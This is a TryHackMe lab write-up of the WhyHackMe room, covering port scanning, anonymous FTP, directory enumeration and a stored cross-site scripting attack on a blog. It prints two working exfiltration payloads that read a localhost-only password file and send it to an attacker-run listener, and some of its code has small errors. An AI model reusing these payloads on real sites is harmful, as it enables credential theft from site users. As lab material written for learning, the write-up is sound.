<h1 align="center">WhyHackMe</h1>
<p align="center"> <img width="160px" src="https://github.com/user-attachments/assets/4f58f330-acaf-469d-9d2f-1c4822e39fa2"><br>
Jun 6, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure,<br>
part of my 396-day-streak in  <a href="https://tryhackme.com">TryHackMe</a><br>
Dive into the depths of security and analysis with WhyHackMe. <a href="https://tryhackme.com/room/whyhackme"</a>here.<br><br>
<img width="1000px" src=""></p>

<br>

<h2>Task 1 . Exploit!</h2>

<p>A combo of compromising and analysis for security enthusiasts.<br><br>

Please allow the machine 2 - 3 minutes to boot up.</p>

<h3 align="left">Answer the question below</h3>

> 1.1. <em>What is the user flag?</em><br><a id='1.1'></a>
>> <strong><code>_______________</code></strong><br>

> 1.2. <em>What is the root flag?</em><br><a id='1.2'></a>
>> <strong><code>_______________</code></strong><br>

<h3>nmap</h3>

```bash
:~# nmap -sC -sV -Pn -p- -T4 10.10.161.40
...
Host is up (0.00072s latency).
Not shown: 65531 closed ports
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.101.19
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome!!
41312/tcp filtered unknown
...
```

<h3>FTP</h3>

```bash
:~# ftp 10.10.161.40
Connected to 10.10.161.40.
220 (vsFTPd 3.0.3)
Name (10.10.161.40:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> get update.txt
local: update.txt remote: update.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for update.txt (318 bytes).
226 Transfer complete.
318 bytes received in 0.00 secs (194.9447 kB/s)
ftp> exit
221 Goodbye.
```

<h3>update.txt</h3>

<p>- <code>mike</code> and <code>admin</code><br>
- <code>127.0.0.1/dir/pass.txt</code></p>

```bash
:~# cat update.txt
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin
```

<h3>gobuster</h3>

```bash
:~# gobuster dir -u http://10.10.161.40/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 100
...
/.php                 (Status: 403) [Size: 277]
/dir                  (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.161.40/assets/]
/login.php            (Status: 200) [Size: 523]
/blog.php             (Status: 200) [Size: 3102]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 563]
/register.php         (Status: 200) [Size: 643]
...
/server-status        (Status: 403) [Size: 277]
```

<h3>http://TargetIP/register.php</h3>

<p>Registered researcher:pass</p>

![image](https://github.com/user-attachments/assets/6e502242-20ec-45ee-b6b6-8d4435fd9ce9)

![image](https://github.com/user-attachments/assets/cee67e85-c4c4-4ef3-bce2-b78a404eeb95)

![image](https://github.com/user-attachments/assets/ef44bd26-3845-404c-9ed5-a364bed1f02f)

![image](https://github.com/user-attachments/assets/3a7c21f0-6465-4d36-8d58-4000dcd4155c)

![image](https://github.com/user-attachments/assets/82e43874-d8d6-4a54-bdde-6d6aca0b8f7e)

<h3>Payload</h3>

```bash
<script>alert("Testing!!!")</script>
```

![image](https://github.com/user-attachments/assets/b27965dd-0880-4d18-b853-eb66f8fb1e87)


<h3>Script: <code>hey.js</code></h3>

```bash
var url = "http://127.0.0.1/dir/pass.txt";
var attacker = "http://10.10.101.19:8000";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true):
xhr.send(null);

```

<h3>HTTP server</h3>

```bash
:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<h3>Listener</h3>

```bash
~# nc -lnvp 4444
Listening on 0.0.0.0 4444
```

<h3>Payload</h3>

```bash
<script src="http://10.10.101.19.63.57/hey.js"></script>
```

![image](https://github.com/user-attachments/assets/67736691-aa06-411a-8bf5-0adfbb89d3fa)

![image](https://github.com/user-attachments/assets/cb473289-b1f0-4c36-b678-815f7a4e4646)

![image](https://github.com/user-attachments/assets/a6b35ef4-a436-44c2-b927-7622e3d9e3ad)


<h3>http://TargetIP/register.php</h3>

<p>Registered practitioner:pass</p>

<h3>Payload</h3>

```bash
<script>fetch("http://127.0.0.1/dir/pass.txt").then(x => x.text()).then(y => fetch("http://10.10.101.19:8000",  {method: "POST", body:y}));</script>
```

![image](https://github.com/user-attachments/assets/db67789f-dcb4-4af2-8181-782a55510956)


